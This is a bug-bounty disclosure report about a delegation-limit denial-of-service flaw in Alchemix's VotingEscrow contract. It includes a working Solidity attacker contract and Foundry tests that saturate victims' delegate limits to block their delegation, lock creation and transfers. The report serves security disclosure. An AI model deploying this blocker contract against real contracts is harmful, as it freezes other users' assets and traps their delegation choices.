# 31151 - \[SC - Medium] Delegation Saturation Leading to Asset Freezing...

Submitted on May 13th 2024 at 17:22:16 UTC by @Limbooo for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31151

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Temporary freezing of NFTs

## Description

## Intro

The `VotingEscrow.sol` contract contains a critical design flaw involving the `MAX_DELEGATES` limit, which is meant to cap the number of token IDs a delegate can manage. This limitation, while intended to prevent excessive computational load, can be maliciously exploited to cause denial of service and manipulate delegation processes.

## Vulnerability Details

The vulnerability exists due to the static nature of the `MAX_DELEGATES` limit and its enforcement in the contract's delegation logic. When a user or contract attempts to delegate tokens, the contract checks whether adding more token IDs would exceed this limit for the delegatee. Malicious actors can deliberately saturate this limit by creating numerous delegations with minimal token amounts (1 Wei), preventing further legitimate delegations and operations.

In the current implementation the limit is set to `1024` tokens \[1], this limit is used to avoid excessive gas usage that prevent a case where block limit reached. However, this limit is checked whenever a user call `VotingEscrow::delegate`, `VotingEscrow::createLockFor`, or `VotingEscrow::transferFrom`. This happens when those functionalities process the movement of the delegated tokens either by `_moveTokenDelegates` \[2] or `_moveAllDelegates` \[3].

## Impact Details

* **Denial of Service (DoS)**: By reaching the `MAX_DELEGATES` limit for a delegatee, an attacker can prevent all further delegations to that delegatee. This can block crucial operations such as token transfers, lock creation, and more, effectively disabling key functionalities for users.
* **Asset Freezing**: Users may find themselves unable to transfer or operate their tokens if an attacker targets their delegatees, leading to a freezing of assets which could damage user trust and the platform’s usability.
* **Delegation Manipulation**: Attackers can manipulate the delegation process to their advantage, either by blocking potential delegatees to harm competitors or by protecting their delegation status from being overridden, thereby maintaining control over delegated tokens.

## Recommended Mitigations

To effectively mitigate the risks associated with the `MAX_DELEGATES` vulnerability, we propose the following enhanced strategies:

1. **Distinct Delegate Limits**: Implement two separate delegate limits:

* **Internal Delegate Limit**: A higher limit for delegations where the tokens owner and the delegatee are the same entity. This addresses the use case of managing multiple tokens more efficiently while still protecting against excessive computational load.
* **External Delegate Limit**: A more restrictive limit for delegations to different entities. This reduces the potential for denial-of-service attacks by limiting the number of delegates an external actor can control, thus safeguarding against malicious saturations.

However, this will generate some **drawbacks** for those users reaching the internal limit when delegations to different entities.

2. **Cooling-Off Period**: Introduce a cooling-off period that temporarily restricts changes to delegations after a delegate limit threshold is approached. This measure would slow down rapid manipulations and give administrators time to address any suspicious activities.
3. **Rate Limiting of Delegate Changes**: Apply rate limiting to operations that can alter delegate counts, such as token transfers and lock creations. This preventative measure would hinder an attacker’s ability to quickly reach delegate limits.

## References

\[1]: [alchemix-v2-dao/src/VotingEscrow.sol#L34 at GitHub](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L34)

\[2]: [alchemix-v2-dao/src/VotingEscrow.sol#L1040 at GitHub](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L1040)

\[3]: [alchemix-v2-dao/src/VotingEscrow.sol#L1110 at GitHub](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L1110)

## Proof of Concept

The Proof of Concept (PoC) involves creating the `VotingEscrowBlocker` contract which is designed to exploit this vulnerability. Here are key functionalities demonstrated by the PoC:

1. **Creating and Merging Locks**: The attacker contract creates locks with minimal token amounts to reach the `MAX_DELEGATES` limit quickly and merges them as needed to maintain control over the total number of delegates.
2. **Blocking Delegations**: By strategically managing the number of active delegates, the attacker can ensure that no new delegates can be added once the limit is reached. This is shown by attempts to delegate to a saturated delegatee, which fail due to the contract's enforcement of the `MAX_DELEGATES` limit.
3. **Front-Running and Disruptive Actions**: The PoC also shows how an attacker can use knowledge of pending transactions to pre-emptively block other users' actions, such as creating locks or transferring tokens, by ensuring that the delegatee remains at the maximum limit.

This PoC validates the severity of the vulnerability and underscores the need for immediate remediation steps to be taken to prevent potential exploits.

### Test Case (Foundry)

**NOTE**: It will takes to much time to finish the test but we can decrease the `MAX_DELEGATES` to a lower value to speed up the test. However, this is not mandatory to make the test success and it will success for the current `MAX_DELEGATES` value.

The test can be added to a new file under the current test suite `src/test/VotingEscrowPoC.t.sol`, then specify the file name in `FILE` flag under `Makefile` configuration. Then, run using `make test_file` command.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "lib/forge-std/src/Test.sol";
import "./BaseTest.sol";
import "openzeppelin-contracts/contracts/token/ERC721/utils/ERC721Holder.sol";

// VotingEscrowBlocker is a contract that help attacker to simplify the attacks.
// This will help to callculate the missing limit on target balance to hit the MAX_DELEGATES limit.
// Also, it will manage its veALCX tokens when increasing and decreasing using create lock and merge
contract VotingEscrowBlocker is ERC721Holder, Ownable {
    uint256 immutable _VEALCX_MAX_DELEGATES;
    VotingEscrow public immutable veALCX;
    address public immutable bpt;

    uint256 public lastUsed;

    constructor(address _ve, address _bpt) {
        veALCX = VotingEscrow(_ve);
        bpt = _bpt;

        _VEALCX_MAX_DELEGATES = veALCX.MAX_DELEGATES();

        IERC20(bpt).approve(address(veALCX), type(uint256).max);
    }

    // Create single lock with very little amount (1 Wie of BPT) 
    function createOneVeALCX() public onlyOwner {
        veALCX.createLockFor(1 wei, 42 weeks, true, address(this));
    }

    // Merge the last two veALCX tokens to reduse the number of balance
    function mergeLastVeALCXs() public onlyOwner {
        uint256[] memory tokenIds = veALCX.getTokenIds(address(this));
        veALCX.merge(tokenIds[tokenIds.length -1], tokenIds[tokenIds.length -2]);
    }

    //  increase balance of VeALCX Tokens
    function increaseVeALCXTokens(uint256 length) public onlyOwner {
        for (uint256 i = 0; i < length; i++) {
            createOneVeALCX();
        }
    }

    //  decrease balance of VeALCX Tokens
    function decreaseVeALCXTokens(uint256 length) public onlyOwner {
        for (uint256 i = 0; i < length; i++) {
            mergeLastVeALCXs();
        }
    }
    

    // Block target address by delegating the balance of this contract to its delegatee, after calculating the limit of the target. 
    function blockDelegateeOf(address target) public onlyOwner {
        address targetDelegatee = veALCX.delegates(target);
        _generateTokenLimitOf(targetDelegatee);
        
        veALCX.delegate(targetDelegatee);
        lastUsed = block.number;
    }

    // Block target to be delegated
    function blockTarget(address target) public onlyOwner {
        _generateTokenLimitOf(target);
        
        veALCX.delegate(target);
        lastUsed = block.number;
    }

    function _generateTokenLimitOf(address target) internal {
        uint256 balance = veALCX.balanceOf(address(this));
        uint256 targetBalance;

        if (veALCX.numCheckpoints(target) > 0) {
            uint256[] memory tokenIds = veALCX.getTokenIds(target);
            targetBalance = tokenIds.length;
        }
        if (targetBalance + balance < _VEALCX_MAX_DELEGATES ) {
            increaseVeALCXTokens(_VEALCX_MAX_DELEGATES - (targetBalance + balance));
        } else if (targetBalance + balance > _VEALCX_MAX_DELEGATES ) {
            decreaseVeALCXTokens((targetBalance + balance) - _VEALCX_MAX_DELEGATES);
        }
    }
}


contract VotingEscrowPoC is BaseTest {
    uint256 public constant THREE_WEEKS = 3 weeks;
    address public attacker;
    address public alice;
    address public bob;

    VotingEscrowBlocker[] public veBlockers;


    function setUp() public {
        // Setup BaseTest contract
        setupContracts(block.timestamp);

        // Setup Attacker address, and mint some bpt tokens (1e18).
        attacker = vm.addr(uint256(keccak256(abi.encodePacked('Attacker'))));
        vm.label(attacker, 'Attacker');
        deal(bpt, attacker, 1 ether);

        // Setup Alice address, and mint some bpt tokens (2e18).
        alice = vm.addr(uint256(keccak256(abi.encodePacked('Alice'))));
        vm.label(alice, 'Alice');
        deal(bpt, alice, 1 ether);
        // Setup Alice address, and mint some bpt tokens (2e18). 
        bob = vm.addr(uint256(keccak256(abi.encodePacked('Bob'))));
        vm.label(bob, 'Bob');
        deal(bpt, bob, 1 ether);

        // Attacker start setup an env for his attacks logic;
        // Create and setup multiple VotingEscrowBlocker so then can be used for multiple targets.
        hevm.startPrank(attacker);
        veBlockers.push(new VotingEscrowBlocker(address(veALCX), address(bpt)));
        veBlockers.push(new VotingEscrowBlocker(address(veALCX), address(bpt)));

        IERC20(bpt).transfer(address(veBlockers[0]), .1 ether);
        IERC20(bpt).transfer(address(veBlockers[1]), .1 ether);

        // To speed up, Attacker has to generate a max token delegate for blocker instances
        veBlockers[0].blockTarget(address(veBlockers[0]));
        veBlockers[1].blockTarget(address(veBlockers[0]));

        hevm.stopPrank();      
    }

    function testAttackerPreventUserFromBeingDelegated() public {
        // mint tokens for alice
        hevm.startPrank(alice);
        IERC20(bpt).approve(address(veALCX), TOKEN_1);
        veALCX.createLock(TOKEN_1, THREE_WEEKS, false);
        hevm.stopPrank();

        // Attacker targeting Bob, So Alice or any other user would not be able to delegate Bob.
        hevm.prank(attacker);
        veBlockers[0].blockTarget(bob);

        // Now, Alice want to delegate Bob,
        // But the call will revert since the attacker saturated bob with dummy tokens. 
        hevm.prank(alice);
        hevm.expectRevert(abi.encodePacked("dst would have too many tokenIds"));
        veALCX.delegate(bob);
    }

    function testAttackerFrontRunsAndBlockCreateLock() public {
        // Alice start a transaction of creating lock for himself
        hevm.prank(alice);
        IERC20(bpt).approve(address(veALCX), TOKEN_1);

        // Attacker front runs alice transaction and block him from creating a lock
        hevm.prank(attacker);
        veBlockers[0].blockDelegateeOf(alice);

        // The revert expected to be: dst would have too many tokenIds
        // This happning since Alice has the maximum delegets amount of token now
        hevm.prank(alice);
        hevm.expectRevert(abi.encodePacked("dst would have too many tokenIds"));
        veALCX.createLock(TOKEN_1, THREE_WEEKS, false);

        // Then, Alice retry to create for another user (Bob)
        // Attacker front runs him and prevent bob from havving a lock too
        hevm.prank(attacker);
        veBlockers[0].blockDelegateeOf(bob);

        hevm.prank(alice);
        hevm.expectRevert(abi.encodePacked("dst would have too many tokenIds"));
        veALCX.createLockFor(TOKEN_1, THREE_WEEKS, false, bob);
    }

    function testAttackerFrontRunsAndBlockTransferFrom() public {
        hevm.startPrank(alice);
        IERC20(bpt).approve(address(veALCX), TOKEN_1);
        uint256 tokenId = veALCX.createLock(TOKEN_1, THREE_WEEKS, false);

        veALCX.transferFrom(alice, bob, tokenId);
        hevm.stopPrank();

        // Front runs transfer transaction
        hevm.prank(attacker);
        veBlockers[0].blockDelegateeOf(alice);

        hevm.prank(bob);
        hevm.expectRevert(abi.encodePacked("dst would have too many tokenIds"));
        veALCX.transferFrom(bob, alice, tokenId);
    }

    function testAttackerPreventHisDelegatorsFromUndelegateHim() public {
        // Let say there is a good active user
        address goodDelegatee = attacker;

        // Multiple users delegate to him
        hevm.startPrank(alice);
        IERC20(bpt).approve(address(veALCX), TOKEN_1);
        veALCX.createLock(TOKEN_1, THREE_WEEKS, false);
        veALCX.delegate(goodDelegatee);
        hevm.stopPrank();

        hevm.startPrank(bob);
        IERC20(bpt).approve(address(veALCX), TOKEN_1);
        veALCX.createLock(TOKEN_1, THREE_WEEKS, false);
        veALCX.delegate(goodDelegatee);
        hevm.stopPrank();

        // However, one day `goodDelegatee` started a malicious activites!
        // His delegtors decided to stop delgating to him,
        // But the `goodDelegatee` turns to be an attacker!
        // Now he will prevent all his delegators from changing him, byy front runs thier transactions
        hevm.prank(goodDelegatee); // goodDelegatee == attacker
        veBlockers[0].blockTarget(alice);
        hevm.prank(goodDelegatee);
        veBlockers[1].blockTarget(bob);

        hevm.prank(alice);
        hevm.expectRevert(abi.encodePacked("dst would have too many tokenIds"));
        veALCX.delegate(alice);

        hevm.prank(alice);
        hevm.expectRevert(abi.encodePacked("dst would have too many tokenIds"));
        veALCX.delegate(bob);
    }
}
```

### Test Output

```bash
alchemix-v2-dao dos-maxdel 18m59s
❯ make test_file
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.g.alchemy.com/v2/*** --match-path src/test/VotingEscrowPoC.t.sol -vv
[⠊] Compiling...
No files changed, compilation skipped

Ran 4 tests for src/test/VotingEscrowPoC.t.sol:VotingEscrowPoC
[PASS] testAttackerFrontRunsAndBlockCreateLock() (gas: 46758218)
[PASS] testAttackerFrontRunsAndBlockTransferFrom() (gas: 29631885)
[PASS] testAttackerPreventHisDelegatorsFromUndelegateHim() (gas: 841509764)
[PASS] testAttackerPreventUserFromBeingDelegated() (gas: 29642124)
Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 1134.36s (560.02s CPU time)

Ran 1 test suite in 1135.64s (1134.36s CPU time): 4 tests passed, 0 failed, 0 skipped (4 total tests)
```
